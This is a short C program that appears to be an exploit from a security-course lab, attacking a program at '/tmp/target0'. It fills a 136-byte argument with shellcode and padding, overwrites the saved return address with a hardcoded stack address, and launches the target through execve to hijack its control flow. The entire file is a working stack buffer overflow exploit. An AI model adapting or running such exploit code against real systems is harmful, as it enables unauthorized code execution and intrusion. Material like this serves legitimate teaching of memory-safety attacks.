#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"

int main(void)
{
	char arg1[136];
	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };
	int target = 0xbefffcc0;
	memset(arg1, 'A', 136);
	memcpy(arg1, shellcode, strlen(shellcode));
	*((int *) (arg1 + 132)) = target;

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}